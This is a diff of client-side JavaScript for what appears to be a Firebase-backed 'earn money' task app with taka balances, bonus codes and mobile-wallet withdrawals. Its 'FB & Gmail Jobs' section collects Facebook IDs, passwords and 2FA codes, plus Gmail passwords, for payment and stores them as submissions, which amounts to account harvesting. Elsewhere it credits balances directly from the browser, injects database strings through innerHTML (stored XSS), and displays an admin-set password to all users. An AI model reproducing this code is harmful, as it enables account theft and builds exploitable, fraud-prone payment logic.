+                if(userData.bannedUntil && new Date(userData.bannedUntil) > new Date()) {
+                    document.getElementById('banned-screen').classList.remove('hidden');
+                    document.getElementById('main-screen').classList.add('hidden');
+                    startBanTimer(userData.bannedUntil);
+                    return; // Stop updating other UI if banned
+                } else {
+                    document.getElementById('banned-screen').classList.add('hidden');
+                    if(userData.bannedUntil) update(ref(db, `users/${uid}`), { bannedUntil: null }); // auto clear
+                }
+
+                document.getElementById('dash-bal').innerText = `৳${userData.mainBalance.toFixed(2)}`;
+                document.getElementById('top-bal').innerText = `৳${userData.mainBalance.toFixed(2)}`;
+                document.getElementById('dash-today').innerText = `৳${userData.todayEarnings.toFixed(2)}`;
+                document.getElementById('dash-total').innerText = `৳${userData.totalEarnings.toFixed(2)}`;
+                document.getElementById('dash-ref').innerText = `৳${userData.refEarnings.toFixed(2)}`;
+                document.getElementById('dash-tasks-count').innerText = userData.tasksCompleted || 0;
+                
+                document.getElementById('refer-code-display').innerText = userData.myRefCode;
+                document.getElementById('refer-count').innerText = userData.totalReferrals || 0;
+                document.getElementById('refer-earned').innerText = `৳${userData.refEarnings.toFixed(2)}`;
+                document.getElementById('wallet-balance').innerText = `৳${userData.mainBalance.toFixed(2)}`;
+                document.getElementById('prof-name').innerText = userData.name;
+                document.getElementById('prof-email').innerText = userData.email;
+            }
+        });
+
+        // Settings
+        onValue(ref(db, 'settings'), (snap) => {
+            if(snap.exists()) {
+                appSettings = snap.val();
+                
+                // Maintenance
+                if(appSettings.maintenance === true) {
+                    document.getElementById('maintenance-screen').classList.remove('hidden');
+                    document.getElementById('main-screen').classList.add('hidden');
+                } else {
+                    document.getElementById('maintenance-screen').classList.add('hidden');
+                    if(currentUser && (!userData.bannedUntil || new Date(userData.bannedUntil) <= new Date())) document.getElementById('main-screen').classList.remove('hidden');
+                }
+
+                // Notice
+                if(appSettings.notice && appSettings.notice.enabled) {
+                    const noticeKey = 'notice_' + appSettings.notice.timestamp;
+                    if(!sessionStorage.getItem(noticeKey)) {
+                        document.getElementById('notice-text').innerText = appSettings.notice.text;
+                        const btn = document.getElementById('notice-btn');
+                        if(appSettings.notice.link) { btn.href = appSettings.notice.link; btn.classList.remove('hidden'); } 
+                        else { btn.classList.add('hidden'); }
+                        document.getElementById('notice-modal').classList.remove('hidden');
+                        sessionStorage.setItem(noticeKey, 'true');
+                    }
+                }
+
+                // Withdraw
+                if(appSettings.withdraw) {
+                    const sel = document.getElementById('wd-method'); sel.innerHTML = '';
+                    if(appSettings.withdraw.bkash) sel.innerHTML += `<option value="Bkash">Bkash</option>`;
+                    if(appSettings.withdraw.nagad) sel.innerHTML += `<option value="Nagad">Nagad</option>`;
+                    if(appSettings.withdraw.rocket) sel.innerHTML += `<option value="Rocket">Rocket</option>`;
+                    document.getElementById('wd-limit-text').innerText = `Min: ৳${appSettings.withdraw.min||20} | Max: ৳${appSettings.withdraw.max||1000}`;
+                }
+
+                // Jobs Setup
+                if(appSettings.gmailJob) { document.getElementById('gmail-admin-pass').innerText = appSettings.gmailJob.password || 'N/A'; document.getElementById('gmail-reward-amt').innerText = `৳${appSettings.gmailJob.price || 0}`; }
+                if(appSettings.facebookJob) { document.getElementById('fb-reward-amt').innerText = `৳${appSettings.facebookJob.price || 0}`; }
+            }
+        });
+
+        // Track submissions
+        onValue(query(ref(db, 'submissions'), orderByChild('uid'), equalTo(uid)), (snap) => {
+            submittedTasks =[]; if(snap.exists()){ snap.forEach(child => submittedTasks.push(child.val().taskId)); }
+            if(!document.getElementById('view-tasks').classList.contains('hidden')) loadTasks();
+        });
+
+        // Support Links
+        onValue(ref(db, 'support'), (snap) => {
+            const container = document.getElementById('support-links-page'); container.innerHTML = "";
+            const platforms =[
+                { id: 'facebook', icon: 'fa-facebook', name: 'Facebook', color: '#1877F2' },
+                { id: 'whatsapp', icon: 'fa-whatsapp', name: 'WhatsApp', color: '#25D366' },
+                { id: 'telegram', icon: 'fa-telegram', name: 'Telegram', color: '#0088cc' },
+                { id: 'youtube', icon: 'fa-youtube', name: 'YouTube', color: '#FF0000' }
+            ];
+            if(snap.exists()){
+                const data = snap.val();
+                platforms.forEach(p => {
+                    if(data[p.id]) {
+                        container.innerHTML += `
+                            <div class="item-card flex-between" onclick="window.open('${data[p.id]}', '_blank')" style="cursor:pointer; border-color:${p.color}; border-width:2px;">
+                                <div style="display:flex; align-items:center; gap:15px;">
+                                    <i class="fab ${p.icon}" style="font-size:30px; color:${p.color};"></i>
+                                    <h3 style="font-weight:700;">Official ${p.name}</h3>
+                                </div>
+                                <i class="fas fa-external-link-alt" style="color:${p.color};"></i>
+                            </div>`;
+                    }
+                });
+            }
+        });
+    }
+
+    function startBanTimer(endTimeStr) {
+        clearInterval(countdownInterval);
+        const el = document.getElementById('ban-timer');
+        const endTime = new Date(endTimeStr).getTime();
+        
+        countdownInterval = setInterval(() => {
+            const now = new Date().getTime();
+            const distance = endTime - now;
+            if (distance < 0) {
+                clearInterval(countdownInterval); el.innerText = "Ban Expired! Refreshing...";
+                location.reload(); return;
+            }
+            const d = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const s = Math.floor((distance % (1000 * 60)) / 1000);
+            el.innerText = `${d}d ${h}h ${m}m ${s}s`;
+        }, 1000);
+    }
+
+    window.copyReferCode = () => { navigator.clipboard.writeText(userData.myRefCode); showMsg("Code Copied! 💖"); };
+
+    // --- 📋 TASKS ---
+    async function loadTasks() {
+        const container = document.getElementById('task-list-container'); container.innerHTML = "<div class='text-center mt-2'><span class='loader'></span></div>";
+        try {
+            const snap = await get(ref(db, 'tasks'));
+            if(!snap.exists()) return container.innerHTML = "<p class='text-center mt-2 text-muted'>No tasks available.</p>";
+            container.innerHTML = "";
+            snap.forEach(child => {
+                const task = child.val(); const tid = child.key;
+                if(task.type !== 'normal' || task.enabled === false) return;
+                const isDone = submittedTasks.includes(tid);
+
+                container.innerHTML += `
+                    <div class="item-card">
+                        <img src="${task.image}" class="task-img">
+                        <div class="flex-between" style="margin-bottom:12px;">
+                            <span style="font-weight:800; font-size:15px;">${task.premium?'👑 ':''}${task.title}</span>
+                            <span class="reward-badge">৳${task.reward}</span>
+                        </div>
+                        <div style="display:flex; gap:10px;">
+                            <button class="btn btn-outline" style="flex:1" onclick="window.open('${task.link}', '_blank')"><i class="fas fa-link"></i> Go Task</button>
+                            ${isDone ? `<button class="btn" disabled style="flex:1"><i class="fas fa-check"></i> Done</button>` : `<button class="btn" style="flex:1" onclick="openSubmitModal('${tid}', ${task.reward})"><i class="fas fa-upload"></i> Submit</button>`}
+                        </div>
+                    </div>`;
+            });
+        } catch(e) { container.innerHTML = "<p class='text-center'>Error loading.</p>"; }
+    }
+
+    window.openSubmitModal = (tid, reward) => { currentTaskToSubmit = { id: tid, reward }; document.getElementById('submit-link-input').value = ''; document.getElementById('submit-user-input').value = ''; document.getElementById('submit-task-modal').classList.remove('hidden'); };
+    window.confirmTaskSubmit = async () => {
+        const link = document.getElementById('submit-link-input').value; 
+        const uname = document.getElementById('submit-user-input').value;
+        if(!link || !uname) return showMsg("Fill both link and username fields!");
+        try { 
+            await push(ref(db, 'submissions'), { uid: currentUser.uid, taskId: currentTaskToSubmit.id, type: 'normal', proof: { imageLink: link, username: uname }, reward: currentTaskToSubmit.reward, status: 'Pending', date: new Date().toISOString() }); 
+            showMsg("Proof Submitted! 💖"); document.getElementById('submit-task-modal').classList.add('hidden'); 
+        } catch(e) { showMsg(e.message); }
+    };
+
+    // --- 📘 FB & 📧 GMAIL JOBS ---
+    window.submitJob = async (type) => {
+        let proof = {}, reward = 0, taskId = `${type.toUpperCase()}_JOB_${Date.now()}`;
+        if(type === 'facebook') {
+            const id = document.getElementById('fb-id').value, pass = document.getElementById('fb-pass').value, code = document.getElementById('fb-2fa').value;
+            if(!id || !pass) return showMsg("ID and Password required!");
+            proof = { id, password: pass, twoFA: code }; reward = appSettings.facebookJob ? appSettings.facebookJob.price : 0;
+        } else {
+            const id = document.getElementById('g-id').value, pass = document.getElementById('g-pass').value;
+            if(!id || !pass) return showMsg("Gmail and Password required!");
+            proof = { id, password: pass }; reward = appSettings.gmailJob ? appSettings.gmailJob.price : 0;
+        }
+        try { 
+            await push(ref(db, 'submissions'), { uid: currentUser.uid, taskId: taskId, type: type, proof: proof, reward: reward, status: 'Pending', date: new Date().toISOString() }); 
+            showMsg(`${type.toUpperCase()} Submitted for review!`); 
+            document.querySelectorAll('input[type="text"], input[type="email"]').forEach(i => i.value='');
+        } catch(e) { showMsg(e.message); }
+    };
+
+    // --- 🎁 BONUS CODE SYSTEM FIXED ---
+    window.applyBonusCode = async () => {
+        const codeInput = document.getElementById('bonus-code-input').value.trim().toUpperCase();
+        if(!codeInput) return showMsg("Enter a code!");
+        const btn = document.getElementById('btn-apply-bonus'); btn.innerHTML = 'Checking...'; btn.disabled = true;
+
+        try {
+            const snap = await get(ref(db, `bonus_codes/${codeInput}`));
+            if(snap.exists()) {
+                const data = snap.val();
+                if(data.active && data.usedCount < data.limit) {
+                    // Check if already used by this user
+                    if(userData.usedCodes && userData.usedCodes[codeInput]) {
+                        showMsg("You already used this code! 💖");
+                    } else {
+                        // All good, process bonus
+                        let updates = {};
+                        updates[`bonus_codes/${codeInput}/usedCount`] = data.usedCount + 1;
+                        if(data.usedCount + 1 >= data.limit) updates[`bonus_codes/${codeInput}/active`] = false;
+                        
+                        updates[`users/${currentUser.uid}/mainBalance`] = (userData.mainBalance || 0) + data.amount;
+                        updates[`users/${currentUser.uid}/usedCodes/${codeInput}`] = true;
+                        
+                        // Push history
+                        const histRef = push(ref(db, 'bonus_history'));
+                        updates[`bonus_history/${histRef.key}`] = { uid: currentUser.uid, code: codeInput, amount: data.amount, date: new Date().toISOString() };
+
+                        await update(ref(db), updates);
+                        showMsg(`Yay! ৳${data.amount} Bonus Added! 💕`);
+                        document.getElementById('bonus-code-input').value = '';
+                    }
+                } else { showMsg("Code expired or limit reached! 🚫"); }
+            } else { showMsg("Invalid Code! 😢"); }
+        } catch(e) { showMsg(e.message); }
+        btn.innerHTML = 'Claim Bonus 💖'; btn.disabled = false;
+    };
+
+    // --- 💰 WITHDRAW ---
+    window.submitWithdraw = async () => {
+        const method = document.getElementById('wd-method').value, num = document.getElementById('wd-number').value, amt = parseFloat(document.getElementById('wd-amount').value);
+        if(!num || !amt) return showMsg("Fill fields."); if(amt > userData.mainBalance) return showMsg("Insufficient Balance!");
+        const minWd = (appSettings.withdraw && appSettings.withdraw.min) ? appSettings.withdraw.min : 20, maxWd = (appSettings.withdraw && appSettings.withdraw.max) ? appSettings.withdraw.max : 1000;
+        if(amt < minWd || amt > maxWd) return showMsg(`Limit: ৳${minWd} - ৳${maxWd}`);
+        try { 
+            await update(ref(db, `users/${currentUser.uid}`), { mainBalance: userData.mainBalance - amt }); 
+            await push(ref(db, 'withdrawals'), { uid: currentUser.uid, method, number: num, amount: amt, status: 'Pending', date: new Date().toISOString() }); 
+            showMsg("Request Sent!"); document.getElementById('wd-number').value = ''; document.getElementById('wd-amount').value = ''; 
+        } catch(e) { showMsg(e.message); }
+    };
+
+    // --- 📜 HISTORY ---
+    window.loadHistory = async (type, btnEl) => {
+        if(btnEl) {
+            btnEl.parentElement.querySelectorAll('button').forEach(b => { b.style.background='transparent'; b.style.color='var(--muted-text)'; b.classList.remove('active-hist'); });
+            btnEl.style.background = 'var(--soft-rose)'; btnEl.style.color = 'var(--primary)'; btnEl.classList.add('active-hist');
+        }
+        const container = document.getElementById('history-list-container'); container.innerHTML = "<div class='text-center mt-2'><span class='loader'></span></div>";
+        try {
+            let html = "";
+            if(type === 'bonus') {
+                const snap = await get(query(ref(db, 'bonus_history'), orderByChild('uid'), equalTo(currentUser.uid)));
+                if(!snap.exists()) return container.innerHTML = "<p class='text-center mt-2 text-muted'>No bonus history.</p>";
+                snap.forEach(child => {
+                    const data = child.val();
+                    html += `<div class="history-item"><div><p style="font-weight:700;">Promo: ${data.code}</p><small>${new Date(data.date).toLocaleDateString()}</small></div><div class="badge badge-approved">+৳${data.amount}</div></div>`;
+                });
+            } else if(type === 'withdraws') {
+                const snap = await get(query(ref(db, 'withdrawals'), orderByChild('uid'), equalTo(currentUser.uid)));
+                if(!snap.exists()) return container.innerHTML = "<p class='text-center mt-2 text-muted'>No withdraw history.</p>";
+                snap.forEach(child => {
+                    const data = child.val(); const bClass = `badge-${data.status.toLowerCase()}`;
+                    html += `<div class="history-item"><div><p style="font-weight:700;">${data.method} - ৳${data.amount}</p><small>${data.number}</small></div><div class="badge ${bClass}">${data.status}</div></div>`;
+                });
+            } else {
+                const snap = await get(query(ref(db, 'submissions'), orderByChild('uid'), equalTo(currentUser.uid)));
+                if(!snap.exists()) return container.innerHTML = "<p class='text-center mt-2 text-muted'>No data found.</p>";
+                snap.forEach(child => {
+                    const data = child.val(); const bClass = `badge-${data.status.toLowerCase()}`;
+                    if((type==='tasks' && data.type==='normal') || (type==='jobs' && (data.type==='facebook' || data.type==='gmail'))) {
+                        html += `<div class="history-item"><div><p style="font-weight:700; text-transform:capitalize;">${data.type} Submit</p><small>Reward: ৳${data.reward}</small></div><div class="badge ${bClass}">${data.status}</div></div>`;
+                    }
+                });
+            }
+            container.innerHTML = html || "<p class='text-center mt-2 text-muted'>No records.</p>";
+        } catch(e) { container.innerHTML = "<p class='text-center'>Error loading.</p>"; }
+    };
+
+</script>
+</body>
+</html>
